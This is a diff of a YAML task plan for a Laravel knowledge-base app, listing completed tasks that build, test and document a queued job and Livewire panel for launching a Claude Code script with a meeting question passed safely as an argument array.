+      4. `LauncherScriptTest`: temp script fixtures for unset / missing / `chmod 644` / `chmod 755`
+      5. `LaunchPreflightTest`: one test per block reason, plus one asserting the **precedence order** from plan §5 with several preconditions failing at once, plus the 8001-character and null-byte rejections
+      6. `php artisan test --filter=Launcher`
+      7. Do **not** add Playwright, Dusk, Pest browser, or viewport suites
+
+      ## Completion Criteria
+      - [x] Every corpus entry survives `toArray()` unchanged as the third element
+      - [x] Each of the eight block reasons has its own assertion on its own string
+      - [x] Preflight precedence is locked by a test
+      - [x] Tests pass; Pint + Larastan green
+
+      ## Git Deliverables
+      - Commit: `test(US-009): TASK-04 cover the argument array and every blocked-launch reason`
+      - Push: **skip** (`git_mode: GITFLOW`)
+      - PR: update the local PR notes only
+    type: Test
+    status: DONE
+    assignee: Anne
+    estimate_hours: 3
+    dependencies:
+      - TASK-03
+    commit:
+      sha: 416f3f19fbfeadab572b978e66e9777b81738e86
+      short_sha: 416f3f1
+      subject: 'test(US-009): TASK-04 cover the argument array and every blocked-launch reason'
+      committed_at: '2026-09-10T08:35:23+02:00'
+      url: 'https://github.com/giarfa/personal-kbms/commit/416f3f19fbfeadab572b978e66e9777b81738e86'
+  -
+    id: TASK-05
+    title: 'Add ClaudeSessionLauncher and the LaunchClaudeSession queued job'
+    body: |-
+      ## Description
+      Execution. The job waits for the exit code under a bounded timeout, per recorded decision `terminal launch mode` (`d184baee682dd396`, superseding `2deaf85cb3b47934`). See plan `## Technical Solution` §4, §5, §6.
+
+      ## Files Involved
+      - app/Launcher/ClaudeSessionLauncher.php
+      - app/Launcher/LaunchOutcome.php
+      - app/Jobs/LaunchClaudeSession.php
+
+      ## Steps
+      1. `App\Launcher\LaunchOutcome`: `final readonly` — `PromptLaunchStatus $status`, `?int $exitCode`, `?string $error`. Named constructors `launched()`, `failed()`, `timedOut()`
+      2. `App\Launcher\ClaudeSessionLauncher::run(LaunchCommand $command): LaunchOutcome`. **No string overload.** Body: `Process::timeout(config('kbms.launch_timeout_seconds'))->run($command->toArray())`. Exit `0` → `launched`; non-zero → `failed` with the exit code and a bounded stderr excerpt (cap at ~2000 chars — a runaway script must not write an unbounded blob into SQLite); `ProcessTimedOutException` → `timedOut` with the contract-violation message from plan §4. Allocate no TTY and no PTY
+      3. `php artisan make:job LaunchClaudeSession --no-interaction`. Constructor takes `public string $launchId`. `public int $tries = 1` with a docblock stating **why** — a retry opens a second terminal window and nothing can suppress the duplicate. `public int $timeout` = `kbms.launch_timeout_seconds + 15` so the worker timeout never fires before the process timeout. No `ShouldBeUnique`
+      4. `handle(LaunchPreflight $preflight, ClaudeSessionLauncher $launcher)`: load the row; **return immediately unless `status === Queued`** (the double-dispatch guard); re-run preflight against the current occurrence and question; a `LaunchBlock` writes `status = Blocked` with the reason and returns **without running any process**; otherwise set `launched_at`, run, and persist status / exit code / error
+      5. Structured `Log::info('kbms.launch', [...])` with the launch id, status, and exit code — never the question text, matching the `kbms.calendar.sync` logging shape
+      6. `php artisan larapilot:quality`
+
+      ## Completion Criteria
+      - [x] `ClaudeSessionLauncher::run()` accepts only a `LaunchCommand`; no code path anywhere builds a command string
+      - [x] The job is `tries = 1`, with the reason docblocked
+      - [x] A row not in `Queued` status is skipped without running a process
+      - [x] Second-pass preflight failure records `Blocked` and runs nothing
+      - [x] Non-zero exit records `exit_code` and a bounded stderr excerpt; timeout records the contract-violation message
+      - [x] Pint + Larastan green
+
+      ## Test Data
+      - N/A — no model or schema change in this task
+
+      ## Git Deliverables
+      - Commit: `feat(US-009): TASK-05 add the session launcher and its queued job`
+      - Push: **skip** (`git_mode: GITFLOW`)
+      - PR: update the local PR notes only
+    type: Impl
+    status: DONE
+    assignee: Alex
+    estimate_hours: 3
+    dependencies:
+      - TASK-02
+      - TASK-03
+    commit:
+      sha: a34abd4f9fa9ab196d042fe34126a0cb8d6efd1d
+      short_sha: a34abd4
+      subject: 'feat(US-009): TASK-05 add the session launcher and its queued job'
+      committed_at: '2026-09-10T08:36:38+02:00'
+      url: 'https://github.com/giarfa/personal-kbms/commit/a34abd4f9fa9ab196d042fe34126a0cb8d6efd1d'
+  -
+    id: TASK-06
+    title: 'Feature-test the job with Process::fake() across every outcome'
+    body: |-
+      ## Description
+      The acceptance criterion says it outright: *"Tests use `Process::fake()` to assert the exact argument array for adversarial question strings, plus every blocked-launch precondition."* Reuse the TASK-04 corpus — do not write a second one.
+
+      ## Files Involved
+      - tests/Feature/LaunchClaudeSessionJobTest.php
+      - tests/Feature/PromptLaunchDurabilityTest.php
+
+      ## Steps
+      1. `Process::fake()`; for every corpus entry assert the recorded invocation's command is the **exact three-element array** — `Process::assertRan(fn ($process) => $process->command === [$script, $contextPath, $question])`. Assert on the array, never on a rendered string
+      2. Exit `0` → row `launched`, `exit_code = 0`, `launched_at` set
+      3. Exit `127` → row `failed`, `exit_code = 127`, stderr excerpt on `error`
+      4. Timeout → row `timed_out` with the contract-violation message; assert the worker is not left hanging
+      5. Second-pass preflight failures (script deleted after dispatch; transcript file removed; `KBMS_TRANSCRIPTS_PATH` repointed) → row `blocked` with the specific reason, `Process::assertNothingRan()`
+      6. A row already `launched` → job returns, `Process::assertNothingRan()`
+      7. Assert `tries === 1` on the job
+      8. `PromptLaunchDurabilityTest`: a resync that retitles, reschedules and cancels the occurrence leaves its launches addressable by natural key — mirror `TranscriptDurabilityTest`
+      9. `php artisan test --filter=LaunchClaudeSession` and `--filter=PromptLaunchDurability`
+      10. Do **not** add Playwright, Dusk, Pest browser, or viewport suites
+
+      ## Completion Criteria
+      - [x] Exact argument array asserted for every adversarial corpus entry
+      - [x] All four terminal statuses covered
+      - [x] Every second-pass precondition asserts `Process::assertNothingRan()`
+      - [x] Double-dispatch guard covered
+      - [x] Launch rows survive a destructive resync
+      - [x] Tests pass; Pint + Larastan green
+
+      ## Git Deliverables
+      - Commit: `test(US-009): TASK-06 cover the launch job with Process::fake()`
+      - Push: **skip** (`git_mode: GITFLOW`)
+      - PR: update the local PR notes only
+    type: Test
+    status: DONE
+    assignee: Anne
+    estimate_hours: 3
+    dependencies:
+      - TASK-05
+    commit:
+      sha: 45de5ad1fdb96312541ce42437ab2a2f2df87c5c
+      short_sha: 45de5ad
+      subject: 'test(US-009): TASK-06 cover the launch job with Process::fake()'
+      committed_at: '2026-09-10T08:38:40+02:00'
+      url: 'https://github.com/giarfa/personal-kbms/commit/45de5ad1fdb96312541ce42437ab2a2f2df87c5c'
+  -
+    id: TASK-07
+    title: 'Build the Ask Claude Code panel and wire it into the meeting page'
+    body: |-
+      ## Description
+      The operator-facing surface, built to `meeting.html` L243-273 and `states.html` L310-367. Replaces the `US-009` placeholder currently in `resources/views/pages/meeting.blade.php`. See plan `## Technical Solution` §7.
+
+      Read `.larapilot/mockups/kbms-app/README.md` before starting — it is the agreed visual contract (`.ai/rules/views.md`).
+
+      ## Files Involved
+      - app/Livewire/AskClaude.php
+      - resources/views/livewire/ask-claude.blade.php
+      - resources/views/pages/meeting.blade.php
+      - resources/css/app.css
+
+      ## Steps
+      1. `php artisan make:livewire AskClaude --class --no-interaction` (class-based, per `.ai/rules/livewire.md`)
+      2. `#[Locked] string $eventUid` and `$eventRecurrenceId` set in `mount()` from the occurrence — store the natural key, never the model, matching `MeetingNotes` and `TranscriptPanel`. `public string $question = ''`
+      3. `render()` runs `LaunchPreflight` and passes either the `LaunchCommand` (for `display()`) or the `LaunchBlock` (for its message) to the view, plus the latest `PromptLaunch` for this occurrence. `render()` performs **no writes** — the same discipline `TranscriptPanel` documents
+      4. `launch()`: validate the question (`required`, trimmed non-empty, `max:` from `kbms.question_max_chars`) with the mockup's wording; re-run preflight; write the `PromptLaunch` row with `status = Queued` and `command` from `LaunchCommand::toArray()`; `LaunchClaudeSession::dispatch($row->id)`
+      5. View, to the mockup: `Yours` flag; `Launcher ready` / `Blocked` tag; `kb-textarea kb-textarea--sm` with the help line *"Handed to your script as the second argument, exactly as typed — quotes, newlines and `$(...)` included, never interpreted."*; the **only** `sk-btn--primary` on the page, disabled with `aria-describedby` pointing at the block reason when preflight refuses; `<pre class="kb-command">` with the three lines and `.kb-arg` / `.kb-arg--2`; a Copy invocation button reusing `onclick="navigator.clipboard.writeText(@js($display))"` from `transcript-panel.blade.php` L108-114; the caption *"Two arguments, in order: context file, then question."*
+      6. Empty-question error: `aria-invalid="true"` on the textarea, `role="alert"` on the message
+      7. Latest outcome: `Dispatched` tag while `queued`; `kb-banner role="alert"` with *"Launcher exited {code}"* on `failed`; the timeout message on `timed_out`; the block reason on `blocked`
+      8. `wire:poll.1s` **only** while the latest launch is `queued`; after `2 × kbms.launch_timeout_seconds` still queued, add *"still queued — is `php artisan queue:work` running?"*
+      9. Port `.kb-command`, `.kb-command .kb-arg`, `.kb-command .kb-arg--2` from `.larapilot/mockups/kbms-app/kbms.css` L324-331 into `resources/css/app.css`
+      10. Replace the placeholder `<section>` in `pages/meeting.blade.php` with `<livewire:ask-claude :occurrence="$row->event" />`
+      11. `npm run build`; smoke-check both themes at 1280 and 768 px — the `<pre>` scrolls horizontally rather than wrapping the arguments
+      12. `php artisan larapilot:quality`
+
+      ## Completion Criteria
+      - [x] Each blocked precondition renders its own distinct sentence, naming its configuration key or action
+      - [x] The rendered invocation is `LaunchCommand::display()` — the panel and the job derive from the same object
+      - [x] `render()` writes nothing
+      - [x] Polling runs only while a launch is `queued` and stops on a terminal status
+      - [x] The `US-009` placeholder text is gone from `pages/meeting.blade.php`
+      - [x] AA contrast for `.kb-arg` / `.kb-arg--2` in light and dark; nothing breaks below 768 px
+      - [x] Pint + Larastan green
+
+      ## Test Data
+      - N/A — no model or schema change in this task
+
+      ## Git Deliverables
+      - Commit: `feat(US-009): TASK-07 add the Ask Claude Code panel to the meeting page`
+      - Push: **skip** (`git_mode: GITFLOW`)
+      - PR: update the local PR notes only
+    type: Impl
+    status: DONE
+    assignee: Joe
+    estimate_hours: 4.5
+    dependencies:
+      - TASK-05
+    commit:
+      sha: 9798185cb3b6d6c1ec73cdf3a6158dd6eaf105ca
+      short_sha: '9798185'
+      subject: 'feat(US-009): TASK-07 add the Ask Claude Code panel to the meeting page'
+      committed_at: '2026-09-10T08:43:12+02:00'
+      url: 'https://github.com/giarfa/personal-kbms/commit/9798185cb3b6d6c1ec73cdf3a6158dd6eaf105ca'
+  -
+    id: TASK-08
+    title: 'Feature-test the panel: blocked states, validation, dispatch and outcome'
+    body: |-
+      ## Description
+      Livewire coverage. The mockup's contract for Anne is explicit: *"Feature tests should assert the distinguishing string, not just a non-200 or a generic error class."*
+
+      ## Files Involved
+      - tests/Feature/AskClaudePanelTest.php
+      - tests/Feature/MeetingDetailTest.php (placeholder removal)
+
+      ## Steps
+      1. `Queue::fake()`. One test per blocked precondition asserting **its own string** — unset launcher, missing script, non-executable script, no transcript, tombstoned transcript, escaping path, unreadable file. Each asserts `Queue::assertNothingPushed()`
+      2. Empty and whitespace-only questions: rejected with the mockup's wording, nothing dispatched
+      3. An 8001-character question: rejected with the character bound in the message; an 8000-character question: accepted
+      4. A valid launch: writes exactly one `PromptLaunch` with `status = queued` and a three-element `command`, and pushes exactly one `LaunchClaudeSession` carrying that row's id
+      5. The rendered invocation equals `LaunchCommand::display()` for an adversarial question
+      6. A `failed` latest launch surfaces "Launcher exited 127"; a `timed_out` one surfaces the contract-violation message
+      7. `MeetingDetailTest`: assert the US-009 placeholder string is gone and the panel renders
+      8. `php artisan test --filter=AskClaudePanel` and the full suite once
+      9. Write the **manual test handoff** section for review, per plan `## Test Strategy`
+      10. Do **not** add Playwright, Dusk, Pest browser, or viewport suites
+
+      ## Completion Criteria
+      - [x] Every blocked precondition asserted on its distinguishing string, with nothing dispatched
+      - [x] Empty / whitespace-only / over-bound questions rejected before dispatch
+      - [x] A valid launch writes one row and pushes one job
+      - [x] Failure and timeout outcomes surfaced in the panel
+      - [x] Manual test handoff written
+      - [x] Full suite green; Pint + Larastan green
+
+      ## Git Deliverables
+      - Commit: `test(US-009): TASK-08 cover the Ask Claude Code panel`
+      - Push: **skip** (`git_mode: GITFLOW`)
+      - PR: update the local PR notes only
+    type: Test
+    status: DONE
+    assignee: Anne
+    estimate_hours: 3
+    dependencies:
+      - TASK-07
+    commit:
+      sha: 0967fb1dda8ba91df9be83727cd7daa5a598b493
+      short_sha: 0967fb1
+      subject: 'test(US-009): TASK-08 cover the Ask Claude Code panel'
+      committed_at: '2026-09-10T08:45:17+02:00'
+      url: 'https://github.com/giarfa/personal-kbms/commit/0967fb1dda8ba91df9be83727cd7daa5a598b493'
+  -
+    id: TASK-09
+    title: 'Document the launch bridge'
+    body: |-
+      ## Description
+      Baseline documentation only, per the recorded `documentation scope` decision — no OpenAPI, no diagrams, no manuals. See plan `## Technical Solution` §9.
+
+      ## Files Involved
+      - README.md
+      - .larapilot/docs/PRD.md
+      - CHANGELOG.md
+
+      ## Steps
+      1. README configuration table: add `KBMS_LAUNCH_TIMEOUT_SECONDS` (`30`, No, US-009) and `KBMS_QUESTION_MAX_CHARS` (`8000`, No, US-009)
+      2. README **"The launcher script contract"** section: state that the script must **return once it has spawned its own terminal window** (a script that runs Claude in the foreground will hit the timeout); that its exit code is recorded on the launch row and shown in the meeting page; and that `php artisan queue:work` must be running for any launch to happen — a reachable queue is not a running worker
+      3. README "Running the background processes": correct the existing comment that credits the launch bridge to US-007 — it is US-009
+      4. PRD `## Configuration surface`: add both keys with their defaults. PRD `## Core Components`: add `exit_code` to the `prompt_launches` column list
+      5. PRD `## PRD Revision History`: append a row — `2026-09-10 | larapilot-plan US-009 | Added KBMS_LAUNCH_TIMEOUT_SECONDS (30) and KBMS_QUESTION_MAX_CHARS (8000) to the configuration surface; added exit_code to prompt_launches; recorded that the queued job waits for the launcher's exit code under a bounded timeout, superseding the inception "Process::start" detail`
+      6. `CHANGELOG.md` Unreleased → `Added`: the Claude Code launch bridge
+      7. `php artisan larapilot:quality`
+
+      ## Completion Criteria
+      - [x] Both new keys in the README table and the PRD configuration surface
+      - [x] The launcher contract section states the return requirement, the exit-code recording, and the queue-worker requirement
+      - [x] The US-007/US-009 attribution error in the README is fixed
+      - [x] PRD revision history row appended
+      - [x] CHANGELOG Unreleased updated
+
+      ## Test Data
+      - N/A — documentation only
+
+      ## Git Deliverables
+      - Commit: `docs(US-009): TASK-09 document the launch bridge and its configuration`
+      - Push: **skip** (`git_mode: GITFLOW`)
+      - PR: update the local PR notes only
+    type: Impl
+    status: DONE
+    assignee: Albert
+    estimate_hours: 1.5
+    dependencies:
+      - TASK-07
+    commit:
+      sha: 57a0acf5bff277da5aa158a66b33952679986cb7
+      short_sha: 57a0acf
+      subject: 'docs(US-009): TASK-09 document the launch bridge and its configuration'
+      committed_at: '2026-09-10T08:46:29+02:00'
+      url: 'https://github.com/giarfa/personal-kbms/commit/57a0acf5bff277da5aa158a66b33952679986cb7'
+updated_at: '2026-09-10T08:46:30+02:00'
